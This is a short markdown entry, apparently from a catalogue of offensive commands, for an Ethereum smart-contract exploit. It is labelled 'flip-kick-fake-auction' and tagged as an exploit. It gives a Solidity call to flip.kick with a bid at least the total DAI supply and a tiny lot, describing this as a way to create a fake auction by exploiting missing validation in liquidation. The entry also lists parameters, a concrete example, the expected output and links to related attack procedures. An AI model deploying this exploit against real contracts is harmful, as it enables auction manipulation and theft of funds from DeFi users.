---
data: 'flip.kick({bid: totalDAISupply, lot: smallNonZeroValue});'
tags:
  - blockchain
  - exploit
type: command
executor: solidity
platforms:
  - Ethereum
id: 02855d53-ed39-475d-b549-e71eb59da549
created_at: '2025-12-11T06:10:22.246Z'
updated_at: '2025-12-11T06:10:22.246Z'
verified: false
validated: true
submitted: true
---
# flip-kick-fake-auction

## Command

```solidity
flip.kick({bid: totalDAISupply, lot: smallNonZeroValue});
```

## Description

Initiates a fake auction in the flipper contract with arbitrary large bid and small lot, exploiting lack of validation during liquidation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `bid` | Arbitrary large value, at least total DAI supply | Yes |
| `lot` | Arbitrarily small non-zero value | Yes |

## Examples

### Basic Usage

```solidity
flip.kick({bid: 1000000000000000000000000, lot: 1});
```

## Expected Output

Creates a fake auction with the specified bid and lot, returning an auction ID.

## Related

- [[procedures/Create-Fake-Auction-via-Flip.Kick]]
- [[commands/end-skip-issue-dai]]
